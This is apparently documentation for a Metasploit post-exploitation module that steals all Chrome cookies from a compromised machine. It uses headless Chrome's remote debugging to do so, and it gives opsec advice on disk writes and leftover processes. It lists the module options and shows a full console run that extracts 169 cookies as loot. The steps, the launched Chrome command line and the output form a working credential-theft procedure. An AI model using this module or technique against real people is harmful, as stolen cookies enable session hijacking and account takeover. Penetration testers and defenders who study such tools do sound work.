## Gather Chrome Cookies

Reads all cookies from the Default Chrome Profile on the target machine. Uses [Headless Chrome](https://developers.google.com/web/updates/2017/04/headless-chrome) and [Chrome's Remote Debugging](https://chromedevtools.github.io/devtools-protocol/).

## Opsec

### Disk writes
This writes randomly-named files to disk temporarily. You may want to consider the tradeoff between getting the user's Chrome cookies and the noisiness of writing to disk.

The module writes a random 10-15 character file containing HTML to a directory you can specify via `WRITABLE_DIR`.

### Running processes
On non-Windows non-meterpreter sessions, a headless Chrome process will be left running after module execution is completed. You can still find and kill this process manually after the module execution is completed.

## Vulnerable Application

This module works on Chrome 59 or later on all operating systems. This module has been tested on Windows, Linux, and OSX.

Chrome does not need to be running on the target machine for this module to work.

## Verification Steps

  1. Obtain a session on the target machine
  2. Do: ```use post/multi/gather/chrome_cookies```
  3. Do: ```set SESSION <your session ID>```
  4. Do: ```run```
  5. The current user's Chrome cookies will be stored as loot

## Options

  **CHROME_BINARY_PATH**

  The path to the user's Chrome binary. On Linux this defaults to searching for `google-chrome` in `$PATH`. On macOS, this defaults to `/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'`. If the module doesn't find any cookies, it may be that a different Chrome binary to the one the user normally uses is being run. In that case, you can change the Chrome binary executed with this option.

  **WRITABLE_DIR**

  Directory used to write temporary files.

  Two files are written, with random 10-15 character alphanumeric filenames. One file contains an html file for Chrome and the other is where the cookies are saved. Both files are deleted during cleanup.

  **REMOTE_DEBUGGING_PORT**

  Port to tell Chrome to expose Remote Debugging on. Default is the normal remote debugging port, `9222`.

## Scenarios

### Windows

  Suppose you've got a session on the target machine.

  To extract the target user's Chrome cookies

```
msf > use post/multi/gather/chrome_cookies
msf post(multi/gather/chrome_cookies) > options

Module options (post/multi/gather/chrome_cookies):

   Name                   Current Setting  Required  Description
   ----                   ---------------  --------  -----------
   CHROME_BINARY_PATH                      no        The path to the user's Chrome binary (leave blank to use the default for the OS)
   REMOTE_DEBUGGING_PORT  9222             no        Port on target machine to use for remote debugging protocol
   SESSION                1                yes       The session to run this module on.
   WRITEABLE_DIR                           no        Where to write the html used to steal cookies temporarily, and the cookies. Leave blank to use the default for the OS (/tmp or AppData\Local\Temp)

msf post(multi/gather/chrome_cookies) > set session <your session id>
session => <your session id>

msf post(multi/gather/chrome_cookies) > run

[*] Determining session platform
[*] Platform: windows
[*] Type: meterpreter
[*] Activated Chrome's Remote Debugging (pid: 9452) via "\Program Files (x86)\Google\Chrome\Application\chrome.exe" --window-position=0,0 --enable-logging --v=1 --disable-translate --disable-extensions --disable-background-networking --safebrowsing-disable-auto-update --disable-sync --metrics-recording-only --disable-default-apps --mute-audio --no-first-run --disable-web-security --disable-plugins --disable-gpu  --user-data-dir="\Users\msfdev\AppData\Local\Google\Chrome\User Data"  --remote-debugging-port=9222  \Users\msfdev\AppData\Local\Temp\YaW8HKZdkk2s85D.html
[+] Found Match
[+] 169 Chrome Cookies stored in /home/msfdev/.msf4/loot/20190108065112_default_172.22.222.200_chrome.gather.co_082863.txt
[*] Removing file \Users\msfdev\AppData\Local\Temp\YaW8HKZdkk2s85D.html
[*] Removing file \Users\msfdev\AppData\Local\Google\Chrome\User Data\chrome_debug.log
[*] Post module execution completed
msf5 post(multi/gather/chrome_cookies) >

```

## Future features

### Profiles
This module only extracts cookies from the default Chrome profile. The target may have multiple, and you may which to extract cookies from all of them. This would require enumerating and extracting the profiles by name. Example code to extract cookies from a non-default Chrome profile can be found at https://github.com/defaultnamehere/cookie_crimes.

## See also
See https://github.com/defaultnamehere/cookie_crimes for more information and manual instructions for Windows.

See https://mango.pdf.zone/stealing-chrome-cookies-without-a-password for the blog post in which this technique was first published.
